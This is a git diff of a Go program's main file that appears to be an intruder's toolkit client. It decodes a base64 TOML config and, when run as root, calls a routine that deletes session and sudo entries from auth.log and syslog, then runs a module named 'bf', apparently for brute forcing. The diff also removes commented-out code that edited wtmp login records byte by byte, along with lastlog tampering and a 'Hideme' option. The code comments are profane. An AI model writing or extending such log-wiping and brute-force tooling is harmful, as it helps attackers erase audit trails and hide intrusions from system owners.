@@ -3,15 +3,12 @@ package main
 import (
 	"bytes"
 	"encoding/base64"
-	"encoding/binary"
 	"fmt"
 	"os"
-	"strconv"
-	"strings"
-	bf "test/BF"
-	check "test/CHECK"
-	getpty "test/GETPTY"
-	vars "test/VARS"
+	authlog "test/client/AUTHLOG"
+	bf "test/client/BF"
+	check "test/client/CHECK"
+	vars "test/vars"
 	"time"
 
 	"github.com/BurntSushi/toml"
@@ -76,81 +73,35 @@ import (
 
 // Why i have to delete 2-3 mounths of work. WHY GOD WHY?
 
+// Fucking result from 4000 lines of code i went to 500 nice? FUCK YOU
+
 var ProxyIp [16]byte
 
 var conf vars.Config
 
 func init() {
-	time.Sleep(30 * time.Second)
-	ReadTomlFile()
 
+	ReadTomlFile()
 	if false { //<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,//TODO Remove False
 		os.Remove("config.toml")
 	}
-	// if len(conf.Flags.Knock) > 0 {
-	// 	go knock.SendKnocks(conf.Server.Host, conf.Flags.Knock, 1)
-	// }
 
 }
 
 func main() {
-	// history.DelHistory()
 
-	getpty.GetConectedData(conf)
+	time.Sleep(5 * time.Second)
 
-	fmt.Println(conf.Flags.PidToStart, "SOSTOOOOOOOOOOOOOOOOOOOOOOOO", conf)
-	// fmt.Println("APP", connectedData.AppPTY, "SSH", connectedData.SSHPTY, "USer", connectedData.User, "SSH TIME : ", connectedData.TimeLoginSSH, "AppTime", connectedData.TimeProgrammStart, "SSH PID : ", connectedData.SSHPID, "FirstSpown ID :", connectedData.FirstSpownID)
-	if false {
-		if conf.Flags.Hideme {
+	euid := os.Geteuid()
+	if euid == 0 {
+		authlog.DeleteSessionAndSudoeSyslogAuthlog(conf, vars.AUTH_LOG)
+		fmt.Println("HERE")
+		time.Sleep(10 * time.Second)
+		fmt.Println(conf)
 
-			euid := os.Geteuid()
-			if euid == 0 {
-				// connectedUser := flag.String("u", "ubuntu", "Connected User")
-				// flag.Parse()
-				// myepoch, err := utmp.ParceUtmpFileToGetEpoch(connectedData)
-
-				// check.Check("Error On parshing UTMP file for EPOCH", err)
-				// connectedData.TimeLoginSSHEpoch = myepoch
-				// sessNum, err := utmp.GetSessionId(connectedData.TimeLoginSSHEpoch)
-				// check.Check("error On Getting Session Number", err)
-				// utmp.ClearUTMP(connectedData)
-				// time.Sleep(2 * time.Second)
-				// dataToInfl, _ := parceDataWtmpFile(connectedData)
-
-				// dataToInfl.ConData = connectedData
-				// dataToInfl.ConData.SessionNumber = sessNum
-
-				// lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &conf.Flags.ConnectedUser)
-				// /////////////////////////////////////////////////////////////////////////////
-				// sessionStart := int(dataToInfl.Time.Sec)
-				// sessionStop := int(dataToInfl.TimeEnd.Sec)
-
-				// start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
-
-				// fmt.Println(sessionStart, sessionStop, connectedData.TimeLoginSSH, "AAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSS~~~~~~~~~~~~~~")
-
-				// TODO delete previous  DONT DELETE THE FOLLOWING
-				fmt.Println("HERE")
-				time.Sleep(10 * time.Second)
-				// ConvertIPToBytearray(&connectedData.IP)
-				// err := authlog.DeleteLineAuthLogAndSyslog(vars.AUTH_LOG, connectedData) //
-				// if err != nil {
-				// 	fmt.Println(err)
-				// }
-				// err = authlog.DeleteLineAuthLogAndSyslog(vars.SYSLOG, connectedData) //
-				// if err != nil {
-				// 	fmt.Println(err)
-				// } //
-
-			}
-		}
-
-		if true { //TODO REMOVE false
-			bf.Bf(conf) //
-		}
 	}
 
-	// time.Sleep(15 * time.Second) //
+	bf.Bf(conf) //
 
 }
 
@@ -161,150 +112,7 @@ func ReadTomlFile() {
 		fmt.Println("Error decoding base64 TOML:", err)
 		return
 	}
-
-	// var conf vars.Config
-
-	// Use bytes.NewReader to pass the decoded string as a reader
 	reader := bytes.NewReader(decodedToml)
 	z := toml.NewDecoder(reader)
 	z.Decode(&conf)
 }
-
-func ConvertIPToBytearray(ip *string) { //
-
-	splitIP := strings.Split(*ip, ".") // [X]
-	for n, s := range splitIP {
-		i, err := strconv.Atoi(s)
-		if err != nil {
-			fmt.Println(err, "asd")
-		}
-
-		// To handle both 32-bit and 64-bit architectures, you can use int32 or int64
-		var number8 int8 = int8(i) // Convert to int64 for this example
-
-		buffer := new(bytes.Buffer)
-		err = binary.Write(buffer, binary.BigEndian, number8)
-		if err != nil {
-			fmt.Println("binary.Write failed:", err)
-		}
-		finalByteArray := buffer.Bytes()
-		ProxyIp[n] = finalByteArray[0]
-	}
-}
-
-// This fuck checks the WTMP file
-// WTMP holds the last data
-// func parceDataWtmpFile(connectedUser vars.ConnectedData) (vars.DataToInfl, error) {
-
-// 	count = 0
-// 	file, err := os.Open(vars.WTMP)
-// 	if err != nil {
-// 		fmt.Printf("Error opening utmp file: %v\n", err)
-// 		return vars.DataToInfl{}, err
-// 	}
-// 	defer file.Close()
-
-// 	DtIN := []vars.DataToInfl{}
-// 	for {
-
-// 		var record vars.Utmp
-// 		err := binary.Read(file, binary.LittleEndian, &record)
-// 		if err != nil {
-// 			break
-// 		}
-
-// 		name := ""
-
-// 		for _, j := range record.User[:] {
-// 			if j > 0 {
-// 				name = name + string(j)
-// 			}
-// 		}
-// 		// bs, err := hex.DecodeString(record.Device)
-// 		if name == connectedUser.User && record.Type == 0x7 { //&& connectedUser.SSHPTY == strings.TrimRight(string(record.Device[:]), "\x00") {
-
-// 			DtIN = append(DtIN, vars.DataToInfl{User: string(record.User[:]),
-// 				Pid: record.Pid,
-// 				Time: vars.TimeVal{
-// 					Sec:  record.Time.Sec,
-// 					Usec: record.Time.Usec},
-// 				TimeEnd: vars.TimeVal{},
-// 				AddrV6:  record.AddrV6,
-// 				Device:  record.Device})
-// 			indexToDel = count
-// 			// fmt.Println(DtIN)
-
-// 		} else if record.Type == 0x8 {
-// 			for i, j := range DtIN {
-// 				// fmt.Println(j.Pid, record.Pid, j.Device, record.Device, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSSSSSSSSSSSSS")
-// 				if j.Pid == record.Pid && reflect.DeepEqual(j.Device, record.Device) {
-// 					DtIN[i].TimeEnd.Sec = record.Time.Sec
-// 					DtIN[i].TimeEnd.Usec = record.Time.Usec
-// 				}
-// 			}
-// 		}
-// 		count += 1
-// 	}
-
-// 	//////////////////////////////////////////////////////////////////////////////
-
-// 	err = deleteBytesFromFile(vars.WTMP, indexToDel*384, 384)
-// 	if err != nil {
-// 		fmt.Println(err)
-// 	}
-// 	//////////////////////////////////////////////////////////////////////////////
-// 	slices.Reverse(DtIN)
-// 	if len(DtIN) > 1 {
-// 		DtIN = DtIN[1:]
-// 		dess := vars.Dessisions{}
-// 		for i, d := range DtIN {
-// 			if connectedUser.User == strings.TrimRight(d.User, "\x00") && strings.Contains(strings.TrimRight(string(d.Device[:]), "\x00"), "pts") {
-// 				dess.Dessision = append(dess.Dessision, i)
-// 			}
-// 		}
-// 		finalDtI := vars.DataToInfl{}
-
-// 		if len(dess.Dessision) > 0 {
-// 			finalDtI = DtIN[dess.Dessision[0]]
-// 			finalDtI.ConData = connectedUser
-// 		}
-// 		return finalDtI, nil
-// 	} else {
-// 		fmt.Println("PRINT THEM")
-// 		// time.Sleep(60 * time.Second)
-// 		return vars.DataToInfl{}, nil
-
-// 	}
-
-// }
-
-// func deleteBytesFromFile(filePath string, start int64, count int64) error { //wtmp 24*384 384
-// 	// Read the file contents
-// 	data, err := os.ReadFile(filePath)
-// 	if err != nil {
-// 		return err
-// 	}
-
-// 	// Check if the range to delete is valid
-// 	fileSize := int64(len(data))
-// 	if start < 0 || start >= fileSize || start+count > fileSize {
-// 		return fmt.Errorf("invalid range")
-// 	}
-
-// 	// Remove the bytes from the slice
-// 	copy(data[start:], data[start+count:])
-
-// 	// Truncate the file
-// 	err = os.Truncate(filePath, fileSize-count)
-// 	if err != nil {
-// 		return err
-// 	}
-
-// 	// Write the modified data back to the file
-// 	err = os.WriteFile(filePath, data[:fileSize-count], 0644)
-// 	if err != nil {
-// 		return err
-// 	}
-
-// 	return nil
-// }
